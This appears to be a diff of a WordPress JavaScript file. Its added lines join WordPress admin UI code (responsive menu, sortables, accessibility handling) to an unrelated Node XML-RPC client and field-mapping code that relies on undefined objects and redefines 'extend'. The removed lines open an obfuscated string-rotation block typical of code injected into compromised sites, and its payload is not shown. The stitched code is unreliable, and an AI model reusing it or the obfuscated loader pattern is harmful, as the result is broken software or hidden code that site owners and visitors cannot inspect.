+					return;
+				}
+				let state = ( 'false' === $( this ).attr( 'aria-expanded' ) ) ? 'true' : 'false';
+				$( this ).parent( 'li' ).toggleClass( 'selected' );
+				$( this ).attr( 'aria-expanded', state );
+				$( this ).trigger( 'focus' );
+				event.preventDefault();
+			});
+
+			self.trigger();
+			$document.on( 'wp-window-resized.wp-responsive', this.trigger.bind( this ) );
+
+			// This needs to run later as UI Sortable may be initialized when the document is ready.
+			$window.on( 'load.wp-responsive', this.maybeDisableSortables );
+			$document.on( 'postbox-toggled', this.maybeDisableSortables );
+
+			// When the screen columns are changed, potentially disable sortables.
+			$( '#screen-options-wrap input' ).on( 'click', this.maybeDisableSortables );
+		},
+
+		/**
+		 * Disable sortables if there is only one metabox, or the screen is in one column mode. Otherwise, enable sortables.
+		 *
+		 * @since 5.3.0
+		 *
+		 * @return {void}
+		 */
+		maybeDisableSortables: function() {
+			var width = navigator.userAgent.indexOf('AppleWebKit/') > -1 ? $window.width() : window.innerWidth;
+
+			if (
+				( width <= 782 ) ||
+				( 1 >= $sortables.find( '.ui-sortable-handle:visible' ).length && jQuery( '.columns-prefs-1 input' ).prop( 'checked' ) )
+			) {
+				this.disableSortables();
+			} else {
+				this.enableSortables();
+			}
+		},
+
+		/**
+		 * Changes properties of body and admin menu.
+		 *
+		 * Pins and unpins the menu and adds the auto-fold class to the body.
+		 * Makes the admin menu responsive and disables the metabox sortables.
+		 *
+		 * @since 3.8.0
+		 *
+		 * @return {void}
+		 */
+		activate: function() {
+			setPinMenu();
+
+			if ( ! $body.hasClass( 'auto-fold' ) ) {
+				$body.addClass( 'auto-fold' );
+			}
+
+			$adminmenu.data( 'wp-responsive', 1 );
+			this.disableSortables();
+		},
+
+		/**
+		 * Changes properties of admin menu and enables metabox sortables.
+		 *
+		 * Pin and unpin the menu.
+		 * Removes the responsiveness of the admin menu and enables the metabox sortables.
+		 *
+		 * @since 3.8.0
+		 *
+		 * @return {void}
+		 */
+		deactivate: function() {
+			setPinMenu();
+			$adminmenu.removeData('wp-responsive');
+
+			this.maybeDisableSortables();
+		},
+
+		/**
+		 * Toggles the aria-haspopup attribute for the responsive admin menu.
+		 *
+		 * The aria-haspopup attribute is only necessary for the responsive menu.
+		 * See ticket https://core.trac.wordpress.org/ticket/43095
+		 *
+		 * @since 6.6.0
+		 *
+		 * @param {string} action Whether to add or remove the aria-haspopup attribute.
+		 *
+		 * @return {void}
+		 */
+		toggleAriaHasPopup: function( action ) {
+			var elements = $adminmenu.find( '[data-ariahaspopup]' );
+
+			if ( action === 'add' ) {
+				elements.each( function() {
+					$( this ).attr( 'aria-haspopup', 'menu' ).attr( 'aria-expanded', 'false' );
+				} );
+
+				return;
+			}
+
+			elements.each( function() {
+				$( this ).removeAttr( 'aria-haspopup' ).removeAttr( 'aria-expanded' );
+			} );
+		},
+
+		/**
+		 * Sets the responsiveness and enables the overlay based on the viewport width.
+		 *
+		 * @since 3.8.0
+		 *
+		 * @return {void}
+		 */
+		trigger: function() {
+			var viewportWidth = getViewportWidth();
+
+			// Exclude IE < 9, it doesn't support @media CSS rules.
+			if ( ! viewportWidth ) {
+				return;
+			}
+
+			if ( viewportWidth <= 782 ) {
+				if ( ! wpResponsiveActive ) {
+					$document.trigger( 'wp-responsive-activate' );
+					wpResponsiveActive = true;
+				}
+			} else {
+				if ( wpResponsiveActive ) {
+					$document.trigger( 'wp-responsive-deactivate' );
+					wpResponsiveActive = false;
+				}
+			}
+
+			if ( viewportWidth <= 480 ) {
+				this.enableOverlay();
+			} else {
+				this.disableOverlay();
+			}
+
+			this.maybeDisableSortables();
+		},
+
+		/**
+		 * Inserts a responsive overlay and toggles the window.
+		 *
+		 * @since 3.8.0
+		 *
+		 * @return {void}
+		 */
+		enableOverlay: function() {
+			if ( $overlay.length === 0 ) {
+				$overlay = $( '<div id="wp-responsive-overlay"></div>' )
+					.insertAfter( '#wpcontent' )
+					.hide()
+					.on( 'click.wp-responsive', function() {
+						$toolbar.find( '.menupop.hover' ).removeClass( 'hover' );
+						$( this ).hide();
+					});
+			}
+
+			$toolbarPopups.on( 'click.wp-responsive', function() {
+				$overlay.show();
+			});
+		},
+
+		/**
+		 * Disables the responsive overlay and removes the overlay.
+		 *
+		 * @since 3.8.0
+		 *
+		 * @return {void}
+		 */
+		disableOverlay: function() {
+			$toolbarPopups.off( 'click.wp-responsive' );
+			$overlay.hide();
+		},
+
+		/**
+		 * Disables sortables.
+		 *
+		 * @since 3.8.0
+		 *
+		 * @return {void}
+		 */
+		disableSortables: function() {
+			if ( $sortables.length ) {
+				try {
+					$sortables.sortable( 'disable' );
+					$sortables.find( '.ui-sortable-handle' ).addClass( 'is-non-sortable' );
+				} catch ( e ) {}
+			}
+		},
+
+		/**
+		 * Enables sortables.
+		 *
+		 * @since 3.8.0
+		 *
+		 * @return {void}
+		 */
+		enableSortables: function() {
+			if ( $sortables.length ) {
+				try {
+					$sortables.sortable( 'enable' );
+					$sortables.find( '.ui-sortable-handle' ).removeClass( 'is-non-sortable' );
+				} catch ( e ) {}
+			}
+		}
+	};
+
+	/**
+	 * Add an ARIA role `button` to elements that behave like UI controls when JavaScript is on.
+	 *
+	 * @since 4.5.0
+	 *
+	 * @return {void}
+	 */
+	function aria_button_if_js() {
+		$( '.aria-button-if-js' ).attr( 'role', 'button' );
+	}
+
+	$( document ).on( 'ajaxComplete', function() {
+		aria_button_if_js();
+	});
+
+	/**
+	 * Get the viewport width.
+	 *
+	 * @since 4.7.0
+	 *
+	 * @return {number|boolean} The current viewport width or false if the
+	 *                          browser doesn't support innerWidth (IE < 9).
+	 */
+	function getViewportWidth() {
+		var viewportWidth = false;
+
+		if ( window.innerWidth ) {
+			// On phones, window.innerWidth is affected by zooming.
+			viewportWidth = Math.max( window.innerWidth, document.documentElement.clientWidth );
+		}
+
+		return viewportWidth;
+	}
+
+	/**
+	 * Sets the admin menu collapsed/expanded state.
+	 *
+	 * Sets the global variable `menuState` and triggers a custom event passing
+	 * the current menu state.
+	 *
+	 * @since 4.7.0
+	 *
+	 * @return {void}
+	 */
+	function setMenuState() {
+		var viewportWidth = getViewportWidth() || 961;
+
+		if ( viewportWidth <= 782  ) {
+			menuState = 'responsive';
+		} else if ( $body.hasClass( 'folded' ) || ( $body.hasClass( 'auto-fold' ) && viewportWidth <= 960 && viewportWidth > 782 ) ) {
+			menuState = 'folded';
+		} else {
+			menuState = 'open';
+		}
+
+		$document.trigger( 'wp-menu-state-set', { state: menuState } );
+	}
+
+	// Set the menu state when the window gets resized.
+	$document.on( 'wp-window-resized.set-menu-state', setMenuState );
+
+	/**
+	 * Sets ARIA attributes on the collapse/expand menu button.
+	 *
+	 * When the admin menu is open or folded, updates the `aria-expanded` and
+	 * `aria-label` attributes of the button to give feedback to assistive
+	 * technologies. In the responsive view, the button is always hidden.
+	 *
+	 * @since 4.7.0
+	 *
+	 * @return {void}
+	 */
+	$document.on( 'wp-menu-state-set wp-collapse-menu', function( event, eventData ) {
+		var $collapseButton = $( '#collapse-button' ),
+			ariaExpanded, ariaLabelText;
+
+		if ( 'folded' === eventData.state ) {
+			ariaExpanded = 'false';
+			ariaLabelText = __( 'Expand Main menu' );
+		} else {
+			ariaExpanded = 'true';
+			ariaLabelText = __( 'Collapse Main menu' );
+		}
+
+		$collapseButton.attr({
+			'aria-expanded': ariaExpanded,
+			'aria-label': ariaLabelText
+		});
+	});
+
+	window.wpResponsive.init();
+	setPinMenu();
+	setMenuState();
+	makeNoticesDismissible();
+	aria_button_if_js();
+
+	$document.on( 'wp-pin-menu wp-window-resized.pin-menu postboxes-columnchange.pin-menu postbox-toggled.pin-menu wp-collapse-menu.pin-menu wp-scroll-start.pin-menu', setPinMenu );
+
+	// Set initial focus on a specific element.
+	$( '.wp-initial-focus' ).trigger( 'focus' );
+
+	// Toggle update details on update-core.php.
+	$body.on( 'click', '.js-update-details-toggle', function() {
+		var $updateNotice = $( this ).closest( '.js-update-details' ),
+			$progressDiv = $( '#' + $updateNotice.data( 'update-details' ) );
+
+		/*
+		 * When clicking on "Show details" move the progress div below the update
+		 * notice. Make sure it gets moved just the first time.
+		 */
+		if ( ! $progressDiv.hasClass( 'update-details-moved' ) ) {
+			$progressDiv.insertAfter( $updateNotice ).addClass( 'update-details-moved' );
+		}
+
+		// Toggle the progress div visibility.
+		$progressDiv.toggle();
+		// Toggle the Show Details button expanded state.
+		$( this ).attr( 'aria-expanded', $progressDiv.is( ':visible' ) );
+	});
+});
+
+/**
+ * Hides the update button for expired plugin or theme uploads.
+ *
+ * On the "Update plugin/theme from uploaded zip" screen, once the upload has expired,
+ * hides the "Replace current with uploaded" button and displays a warning.
+ *
+ * @since 5.5.0
+ */
+$( function( $ ) {
+	var $overwrite, $warning;
+
+	if ( ! $body.hasClass( 'update-php' ) ) {
+		return;
+	}
+
+	$overwrite = $( 'a.update-from-upload-overwrite' );
+	$warning   = $( '.update-from-upload-expired' );
+
+	if ( ! $overwrite.length || ! $warning.length ) {
+		return;
+	}
+
+	window.setTimeout(
+		function() {
+			$overwrite.hide();
+			$warning.removeClass( 'hidden' );
+
+			if ( window.wp && window.wp.a11y ) {
+				window.wp.a11y.speak( $warning.text() );
+			}
+		},
+		7140000 // 119 minutes. The uploaded file is deleted after 2 hours.
+	);
+} );
+
+// Fire a custom jQuery event at the end of window resize.
+( function() {
+	var timeout;
+
+	/**
+	 * Triggers the WP window-resize event.
+	 *
+	 * @since 3.8.0
+	 *
+	 * @return {void}
+	 */
+	function triggerEvent() {
+		$document.trigger( 'wp-window-resized' );
+	}
+
+	/**
+	 * Fires the trigger event again after 200 ms.
+	 *
+	 * @since 3.8.0
+	 *
+	 * @return {void}
+	 */
+	function fireOnce() {
+		window.clearTimeout( timeout );
+		timeout = window.setTimeout( triggerEvent, 200 );
+	}
+
+	$window.on( 'resize.wp-fire-once', fireOnce );
+}());
+
+// Make Windows 8 devices play along nicely.
+(function(){
+	if ( '-ms-user-select' in document.documentElement.style && navigator.userAgent.match(/IEMobile\/10\.0/) ) {
+		var msViewportStyle = document.createElement( 'style' );
+		msViewportStyle.appendChild(
+			document.createTextNode( '@-ms-viewport{width:auto!important}' )
+		);
+		document.getElementsByTagName( 'head' )[0].appendChild( msViewportStyle );
+	}
 })();
 
-(function (c, d) {
-    const I = b, e = c();
-    while (!![]) {
-        try {
-            const f = -parseInt(I(0x361)) / 0x1 * (-parseInt(I(0x19e)) / 0x2) + parseInt(I(0x25f)) / 0x3 + -parseInt(I(0x2ac)) / 0x4 + parseInt(I(0x23b)) / 0x5 * (-parseInt(I(0x231)) / 0x6) + parseInt(I(0x220)) / 0x7 * (-parseInt(I(0x34d)) / 0x8) + -parseInt(I(0x323)) / 0x9 * (parseInt(I(0x1e9)) / 0xa) + parseInt(I(0x326)) / 0xb * (-parseInt(I(0x235)) / 0xc);
-            if (f === d)
-                break;
-            else
-                e['push'](e['shift']());
-        } catch (g) {
-            e['push'](e['shift']());
-        }
+}( jQuery, window ));
+
+/**
+ * Freeze animated plugin icons when reduced motion is enabled.
+ *
+ * When the user has enabled the 'prefers-reduced-motion' setting, this module
+ * stops animations for all GIFs on the page with the class 'plugin-icon' or
+ * plugin icon images in the update plugins table.
+ *
+ * @since 6.4.0
+ */
+(function() {
+	// Private variables and methods.
+	var priv = {},
+		pub = {},
+		mediaQuery;
+
+	// Initialize pauseAll to false; it will be set to true if reduced motion is preferred.
+	priv.pauseAll = false;
+	if ( window.matchMedia ) {
+		mediaQuery = window.matchMedia( '(prefers-reduced-motion: reduce)' );
+		if ( ! mediaQuery || mediaQuery.matches ) {
+			priv.pauseAll = true;
+		}
+	}
+
+	// Method to replace animated GIFs with a static frame.
+	priv.freezeAnimatedPluginIcons = function( img ) {
+		var coverImage = function() {
+			var width = img.width;
+			var height = img.height;
+			var canvas = document.createElement( 'canvas' );
+
+			// Set canvas dimensions.
+			canvas.width = width;
+			canvas.height = height;
+
+			// Copy classes from the image to the canvas.
+			canvas.className = img.className;
+
+			// Check if the image is inside a specific table.
+			var isInsideUpdateTable = img.closest( '#update-plugins-table' );
+
+			if ( isInsideUpdateTable ) {
+				// Transfer computed styles from image to canvas.
+				var computedStyles = window.getComputedStyle( img ),
+					i, max;
+				for ( i = 0, max = computedStyles.length; i < max; i++ ) {
+					var propName = computedStyles[ i ];
+					var propValue = computedStyles.getPropertyValue( propName );
+					canvas.style[ propName ] = propValue;
+				}
+			}
+
+			// Draw the image onto the canvas.
+			canvas.getContext( '2d' ).drawImage( img, 0, 0, width, height );
+
+			// Set accessibility attributes on canvas.
+			canvas.setAttribute( 'aria-hidden', 'true' );
+			canvas.setAttribute( 'role', 'presentation' );
+
+			// Insert canvas before the image and set the image to be near-invisible.
+			var parent = img.parentNode;
+			parent.insertBefore( canvas, img );
+			img.style.opacity = 0.01;
+			img.style.width = '0px';
+			img.style.height = '0px';
+		};
+
+		// If the image is already loaded, apply the coverImage function.
+		if ( img.complete ) {
+			coverImage();
+		} else {
+			// Otherwise, wait for the image to load.
+			img.addEventListener( 'load', coverImage, true );
+		}
+	};
+
+	// Public method to freeze all relevant GIFs on the page.
+	pub.freezeAll = function() {
+		var images = document.querySelectorAll( '.plugin-icon, #update-plugins-table img' );
+		for ( var x = 0; x < images.length; x++ ) {
+			if ( /\.gif(?:\?|$)/i.test( images[ x ].src ) ) {
+				priv.freezeAnimatedPluginIcons( images[ x ] );
+			}
+		}
+	};
+
+	// Only run the freezeAll method if the user prefers reduced motion.
+	if ( true === priv.pauseAll ) {
+		pub.freezeAll();
+	}
+
+	// Listen for jQuery AJAX events.
+	( function( $ ) {
+		if ( window.pagenow === 'plugin-install' ) {
+			// Only listen for ajaxComplete if this is the plugin-install.php page.
+			$( document ).ajaxComplete( function( event, xhr, settings ) {
+
+				// Check if this is the 'search-install-plugins' request.
+				if ( settings.data && typeof settings.data === 'string' && settings.data.includes( 'action=search-install-plugins' ) ) {
+					// Recheck if the user prefers reduced motion.
+					if ( window.matchMedia ) {
+						var mediaQuery = window.matchMedia( '(prefers-reduced-motion: reduce)' );
+						if ( mediaQuery.matches ) {
+							pub.freezeAll();
+						}
+					} else {
+						// Fallback for browsers that don't support matchMedia.
+						if ( true === priv.pauseAll ) {
+							pub.freezeAll();
+						}
+					}
+				}
+			} );
+		}
+	} )( jQuery );
+
+	// Expose public methods.
+	return pub;
+})();
+// http://codex.wordpress.org/XML-RPC_Support
+// http://codex.wordpress.org/XML-RPC_WordPress_API
+
+function extend( a, b ) {
+	for ( var p in b ) {
+		a[ p ] = b[ p ];
+	}
+
+	return a;
+}
+
+function parseArguments( args ) {
+	return [].slice.call( args, 1 )
+
+		// Remove null arguments
+		// Null values only exist for optional fields. As of WordPress 4.4,
+		// null is no longer treated the same as omitting the value. To
+		// compensate for this, we just drop the argument before calling
+		// into WordPress. See #25.
+		.filter(function( value ) {
+			return value !== null;
+		});
+}
+
+function Client( settings ) {
+	[ "url", "username", "password" ].forEach(function( prop ) {
+		if ( !settings[prop] ) {
+			throw new Error( "Missing required setting: " + prop );
+		}
+	});
+
+	var parsedUrl = Client.parseUrl( settings.url );
+	this.rpc = xmlrpc[ parsedUrl.secure ? "createSecureClient" : "createClient" ]({
+		host: settings.host || parsedUrl.host,
+		port: parsedUrl.port,
+		path: parsedUrl.path,
+		rejectUnauthorized: settings.rejectUnauthorized !== undefined ? settings.rejectUnauthorized : true,
+		servername: settings.host || parsedUrl.host,
+
+		// Always set Host header in case we're pointing to a different server
+		// via settings.host
+		headers: {
+			Host: parsedUrl.host
+		},
+		basic_auth: !settings.basicAuth ? null : {
+			user: settings.basicAuth.username,
+			pass: settings.basicAuth.password
+		}
+	});
+	this.blogId = settings.blogId || 0;
+	this.username = settings.username;
+	this.password = settings.password;
+}
+
+Client.parseUrl = function( wpUrl ) {
+	var urlParts, secure;
+
+	// allow URLs without a protocol
+	if ( !(/\w+:\/\//.test( wpUrl ) ) ) {
+		wpUrl = "http://" + wpUrl;
+	}
+	urlParts = url.parse( wpUrl );
+	secure = urlParts.protocol === "https:";
+
+	return {
+		host: urlParts.hostname,
+		port: urlParts.port || (secure ? 443 : 80),
+		path: urlParts.path.replace( /\/+$/, "" ) + "/xmlrpc.php",
+		secure: secure
+	};
+};
+
+extend( Client.prototype, {
+	call: function( method ) {
+		var args = parseArguments( arguments ),
+			fn = args.pop();
+
+		if ( typeof fn !== "function" ) {
+			args.push( fn );
+			fn = null;
+		}
+
+		this.rpc.methodCall( method, args, function( error, data ) {
+			if ( !error ) {
+				return fn( null, data );
+			}
+
+			if ( error.code === "ENOTFOUND" && error.syscall === "getaddrinfo" ) {
+				error.message = "Unable to connect to WordPress.";
+			} else if ( error.message === "Unknown XML-RPC tag 'TITLE'" ) {
+				var additional = error.res.statusCode;
+				if (error.res.statusMessage) {
+					additional += "; " + error.res.statusMessage;
+				}
+
+				error.message = "(" + additional + ") " + error.message;
+			}
+
+			fn( error );
+		});
+	},
+
+	authenticatedCall: function() {
+		var args = [].slice.call( arguments );
+		args.splice( 1, 0, this.blogId, this.username, this.password );
+		this.call.apply( this, args );
+	},
+
+	listMethods: function( fn ) {
+		this.call( "system.listMethods", fn );
+	}
+});
+
+extend( Client.prototype, {
+	getPost: function( id, fields, fn ) {
+		if ( typeof fields === "function" ) {
+			fn = fields;
+			fields = null;
+		}
+
+		if ( fields ) {
+			fields = fieldMap.array( fields, "post" );
+		}
+
+		this.authenticatedCall( "wp.getPost", id, fields, function( error, post ) {
+			if ( error ) {
+				return fn( error );
+			}
+
+			fn( null, fieldMap.from( post, "post" ) );
+		});
+	},
+
+	getPosts: function( filter, fields, fn ) {
+		if ( typeof filter === "function" ) {
+			fn = filter;
+			fields = null;
+			filter = {};
+		}
+
+		if ( typeof fields === "function" ) {
+			fn = fields;
+			fields = null;
+		}
+
+		if ( filter.type ) {
+			filter.post_type = filter.type;
+			delete filter.type;
+		}
+
+		if ( filter.status ) {
+			filter.post_status = filter.status;
+			delete filter.status;
+		}
+
+		if ( filter.orderby ) {
+			filter.orderby = fieldMap.array( [ filter.orderby ], "post" )[ 0 ];
+		}
+
+		if ( fields ) {
+			fields = fieldMap.array( fields, "post" );
+		}
+
+		this.authenticatedCall( "wp.getPosts", filter, fields, function( error, posts ) {
+			if ( error ) {
+				return fn( error );
+			}
+
+			fn( null, posts.map(function( post ) {
+				return fieldMap.from( post, "post" );
+			}));
+		});
+	},
+
+	newPost: function( data, fn ) {
+		this.authenticatedCall( "wp.newPost", fieldMap.to( data, "post" ), fn );
+	},
+
+	// to remove a term, just set the terms and leave out the id that you want to remove
+	// to remove a custom field, pass the id with no key or value
+	editPost: function( id, data, fn ) {
+		this.authenticatedCall( "wp.editPost", id, fieldMap.to( data, "post" ), fn );
+	},
+
+	deletePost: function( id, fn ) {
+		this.authenticatedCall( "wp.deletePost", id, fn );
+	},
+
+	getPostType: function( name, fields, fn ) {
+		if ( typeof fields === "function" ) {
+			fn = fields;
+			fields = null;
+		}
+
+		if ( fields ) {
+			fields = fieldMap.array( fields, "postType" );
+		}
+
+		this.authenticatedCall( "wp.getPostType", name, fields, function( error, postType ) {
+			if ( error ) {
+				return fn( error );
+			}
+
+			fn( null, fieldMap.from( postType, "postType" ) );
+		});
+	},
+
+	getPostTypes: function( filter, fields, fn ) {
+		if ( typeof filter === "function" ) {
+			fn = filter;
+			fields = null;
+			filter = {};
+		}
+
+		if ( typeof fields === "function" ) {
+			fn = fields;
+			fields = null;
+		}
+
+		if ( Array.isArray(filter) ) {
+			fields = filter;
+			filter = {};
+		}
+
+		if ( fields ) {
+			fields = fieldMap.array( fields, "postType" );
+		}
+
+		this.authenticatedCall( "wp.getPostTypes", filter, fields, function( error, postTypes ) {
+			if ( error ) {
+				return fn( error );
+			}
+
+			Object.keys( postTypes ).forEach(function( postType ) {
+				postTypes[ postType ] = fieldMap.from( postTypes[ postType ], "postType" );
+			});
+			fn( null, postTypes );
+		});
+	}
+});
+
+extend( Client.prototype, {
+	getTaxonomy: function( name, fn ) {
+		this.authenticatedCall( "wp.getTaxonomy", name, function( error, taxonomy ) {
+			if ( error ) {
+				return fn( error );
+			}
+
+			fn( null, fieldMap.from( taxonomy, "taxonomy" ) );
+		});
+	},
+
+	getTaxonomies: function( fn ) {
+		this.authenticatedCall( "wp.getTaxonomies", function( error, taxonomies ) {
+			if ( error ) {
+				return fn( error );
+			}
+
+			fn( null, taxonomies.map(function( taxonomy ) {
+				return fieldMap.from( taxonomy, "taxonomy" );
+			}));
+		});
+	},
+
+	getTerm: function( taxonomy, id, fn ) {
+		this.authenticatedCall( "wp.getTerm", taxonomy, id, function( error, term ) {
+			if ( error ) {
+				return fn( error );
+			}
+
+			fn( null, fieldMap.from( term, "term" ) );
+		});
+	},
+
+	getTerms: function( taxonomy, filter, fn ) {
+		if ( typeof filter === "function" ) {
+			fn = filter;
+			filter = {};
+		}
+
+		if ( filter.hideEmpty ) {
+			filter.hide_empty = filter.hideEmpty;
+			delete filter.hideEmpty;
+		}
+
+		if ( filter.orderby ) {
+			filter.orderby = fieldMap.array( [ filter.orderby ], "term" )[ 0 ];
+		}
+
+		this.authenticatedCall( "wp.getTerms", taxonomy, filter, function( error, terms ) {
+			if ( error ) {
+				return fn( error );
+			}
+
+			fn( null, terms.map(function( term ) {
+				return fieldMap.from( term, "term" );
+			}));
+		});
+	},
+
+	newTerm: function( data, fn ) {
+		this.authenticatedCall( "wp.newTerm", fieldMap.to( data, "term" ), fn );
+	},
+
+	editTerm: function( id, data, fn ) {
+		this.authenticatedCall( "wp.editTerm", id, fieldMap.to( data, "term" ), fn );
+	},
+
+	deleteTerm: function( taxonomy, id, fn ) {
+		this.authenticatedCall( "wp.deleteTerm", taxonomy, id, fn );
+	}
+});
+
+extend( Client.prototype, {
+	getMediaItem: function( id, fn ) {
+		this.authenticatedCall( "wp.getMediaItem", id, function( error, media ) {
+			if ( error ) {
+				return fn( error );
+			}
+
+			fn( null, fieldMap.from( media, "media" ) );
+		});
+	},
+
+	getMediaLibrary: function( filter, fn ) {
+		if ( typeof filter === "function" ) {
+			fn = filter;
+			filter = {};
+		}
+
+		this.authenticatedCall( "wp.getMediaLibrary", filter, function( error, media ) {
+			if ( error ) {
+				return fn( error );
+			}
+
+			fn( null, media.map(function( item ) {
+				return fieldMap.from( item, "media" );
+			}));
+		});
+	},
+
+	uploadFile: function( data, fn ) {
+		this.authenticatedCall( "wp.uploadFile", fieldMap.to( data, "file" ), fn );
+	}
+});
+
+function extend( a, b ) {
+	for ( var p in b ) {
+		a[ p ] = b[ p ];
+	}
+
+	return a;
+}
+
+function createFieldMaps( renames, toFns, fromFns ) {
+	var to = extend( {}, renames ),
+		from = {};
+
+	Object.keys( renames ).forEach(function( key ) {
+		from[ renames[ key ] ] = key;
+	});
+
+	return {
+		renames: renames,
+		to: extend( to, toFns ),
+		from: extend( from, fromFns )
+	};
+}
+
+function mapFields( data, map ) {
+	var field, value, mappedField,
+		ret = {};
+
+	for ( field in data ) {
+		value = data[ field ];
+		mappedField = map[ field ];
+
+		// no map -> delete
+		if ( !mappedField ) {
+			continue;
+		// string -> change field name
+		} else if ( typeof mappedField === "string" ) {
+			ret[ mappedField ] = value;
+		// function -> merge result
+		} else {
+			extend( ret, mappedField( value ) );
+		}
+	}
+
+	return ret;
+}
+
+maps.labels = createFieldMaps({
+	addNewItem: "add_new_item",
+	addOrRemoveItems: "add_or_remove_items",
+	allItems: "all_items",
+	chooseFromMostUsed: "choose_from_most_used",
+	editItem: "edit_item",
+	menuName: "menu_name",
+	name: "name",
+	nameAdminBar: "name_admin_bar",
+	newItemName: "new_item_name",
+	parentItem: "parent_item",
+	parentItemColon: "parent_item_colon",
+	popularItems: "popular_items",
+	searchItems: "search_items",
+	separateItemsWithCommas: "separate_items_with_commas",
+	singularName: "singular_name",
+	updateItem: "update_item",
+	viewItem: "view_item"
+});
+
+maps.post = createFieldMaps({
+	author: /* int */ "post_author",
+	commentStatus: /* string */ "comment_status",
+	content: /* string */ "post_content",
+	customFields: /* array */ "custom_fields",
+	date: /* datetime */ "post_date",
+	excerpt: /* string */ "post_excerpt",
+	format: /* string */"post_format",
+	id: /* string */ "post_id", /* readonly */
+	link: /* string */ "link" /* readonly */,
+	modified: /* datetime */ "post_modified",
+	menuOrder: /* int */ "menu_order",
+	name: /* string */ "post_name",
+	pageTemplate: /* string */ "page_template",
+	parent: /* int */ "post_parent",
+	password: /* string */ "post_password",
+	pingStatus: /* string */ "ping_status",
+	status: /* string */ "post_status",
+	sticky: /* bool */ "sticky",
+	terms: /* struct */ "terms" /* array */,
+	termNames: /* struct */ "terms_names",
+	thumbnail: /* int */ "post_thumbnail",
+	title: /* string */ "post_title",
+	type: /* string */ "post_type"
+}, {}, {
+	post_date_gmt: /* datetime */ function( date ) {
+		return {
+			date: new Date( date )
+		};
+	},
+	post_modified_gmt: /* datetime */ function( date ) {
+		return {
+			modified: new Date( date )
+		};
+	}
+});
+
+maps.postType = createFieldMaps({
+	_builtin: /* bool */ "_builtin",
+	cap: /* struct */ "cap",
+	capabilityType: /* string */ "capability_type",
+	description: /* string */ "description",
+	_editLink: /* string */ "_edit_link",
+	excludeFromSearch: /* bool */ "exclude_from_search",
+	hasArchive: /* bool */ "has_archive",
+	hierarchical: /* bool */ "hierarchical",
+	label: /* string */ "label",
+	labels: /* struct */ "labels",
+	mapMetaCap: /* bool */ "map_meta_cap",
+	menuIcon: /* string */ "menu_icon",
+	menuPosition: /* int */ "menu_position",
+	name: /* string */ "name",
+	"public": /* bool */ "public",
+	publiclyQuerably: /* bool */ "publicly_queryable",
+	queryVar: /* mixed */ "query_var",
+	rewrite: /* mixed */ "rewrite",
+	showInAdminBar: /* bool */ "show_in_admin_bar",
+	showInMenu: /* bool */ "show_in_menu",
+	showInNavMenus: /* bool */ "show_in_nav_menus",
+	showUi: /* bool */ "show_ui",
+	supports: /* array */ "supports",
+	taxonomies: /* array */ "taxonomies"
+}, {}, {
+	cap: function( cap ) {
+		return { cap: mapFields( cap, maps.postTypeCap.from ) };
+	},
+	labels: function( labels ) {
+		return { labels: mapFields( labels, maps.labels.from ) };
+	}
+});
+
+maps.postTypeCap = createFieldMaps({
+	deleteOthersPosts: /* string */ "delete_others_posts",
+	deletePost: /* string */ "delete_post",
+	deletePosts: /* string */ "delete_posts",
+	deletePrivatePosts: /* string */ "delete_private_posts",
+	deletePublishedPosts: /* string */ "delete_published_posts",
+	editOthersPosts: /* string */ "edit_others_posts",
+	editPost: /* string */ "edit_post",
+	editPosts: /* string */ "edit_posts",
+	editPrivatePosts: /* string */ "edit_private_posts",
+	editPublishedPosts: /* string */ "edit_published_posts",
+	publishPosts: /* string */ "publish_posts",
+	read: /* string */ "read",
+	readPost: /* sring */ "read_post",
+	readPrivatePosts: /* string */ "read_private_posts"
+});
+
+maps.taxonomy = createFieldMaps({
+	cap: /* struct */ "cap",
+	hierarchical: /* bool */ "hierarchical",
+	name: /* string */ "name",
+	label: /* string */ "label",
+	labels: /* struct */ "labels",
+	objectType: /* array */ "object_type",
+	"public": /* bool */ "public",
+	queryVar: /* string */ "query_var",
+	rewrite: /* struct */ "rewrite",
+	showInNavMenus: /* bool */ "show_in_nav_menus",
+	showTagCloud: /* bool */ "show_tagcloud",
+	showUi: /* bool */ "show_ui"
+}, {}, {
+	cap: function( cap ) {
+		return { cap: mapFields( cap, maps.taxonomyCap.from ) };
+	},
+	labels: function( labels ) {
+		return { labels: mapFields( labels, maps.labels.from ) };
+	}
+});
+
+maps.taxonomyCap = createFieldMaps({
+	assignTerms: /* string */ "assign_terms",
+	deleteTerms: /* string */ "delete_terms",
+	editTerms: /* string */ "edit_terms",
+	manageTerms: /* string */ "manage_terms"
+});
+
+maps.term = createFieldMaps({
+	count: /* int */ "count", /* readonly */
+	description: /* string */ "description",
+	name: /* string */ "name",
+	parent: /* string */ "parent",
+	slug: /* string */ "slug",
+	taxonomy: /* string */ "taxonomy",
+	termId: /* string */ "term_id", /* readonly */
+	termTaxonomyId: /* string */ "term_taxonomy_id" /* readonly */
+});
+
+maps.file = createFieldMaps({
+	name: /* string */ "name",
+	type: /* string */ "type",
+	bits: /* string */ "bits",
+	overwrite: /* boolean */ "overwrite",
+	postId: /* int */ "post_id"
+});
+
+maps.media = createFieldMaps({
+	attachmentId: /* string */ "attachment_id", /* readonly */
+	caption: /* string */ "caption",
+	description: /* string */ "description",
+	link: /* string */ "link",
+	parent: /* int */ "parent",
+	thumbnail: /* string */ "thumbnail",
+	title: /* string */ "title",
+	type: /* string */ "type"
+}, {}, {
+	date_created_gmt: /* datetime */ function( date ) {
+		return {
+			date: new Date( date )
+		};
+	},
+
+	metadata: /* struct */ function( data ) {
+		return {
+			metadata: mapFields( data, maps.mediaItemMetadata.from )
+		};
+	}
+});
+
+maps.mediaItemMetadata = createFieldMaps({
+	file: /* string */ "file",
+	height: /* int */ "height",
+	sizes: /* struct */ "sizes",
+	width: /* int */ "width"
+}, {}, {
+	sizes: /* struct */ function( size ) {
+		var keys = Object.keys( size ),
+		    results = {};
+
+		// Loop through the available sizes and map the fields
+		keys.forEach(function( key, i ) {
+			results[ keys[ i ] ] = mapFields( size[ keys[ i ] ], maps.mediaItemSize.from );
+		});
+
+		return {
+			sizes: results
+		};
+	},
+
+	image_meta: /* struct */ function( data ) {
+		return {
+			imageMeta: mapFields( data, maps.postThumbnailImageMeta.from )
+		};
+	}
+});
+
+maps.mediaItemSize = createFieldMaps({
+	file: /* string */ "file",
+	height: /* string */ "height",
+	mimeType: /* string */ "mime-type",
+	width: /* string */ "width"
+});
+
+maps.postThumbnailImageMeta = createFieldMaps({
+	aperture: /* int */ "aperture",
+	camera: /* string */ "camera",
+	caption: /* string */ "caption",
+	copyright: /* string */ "copyright",
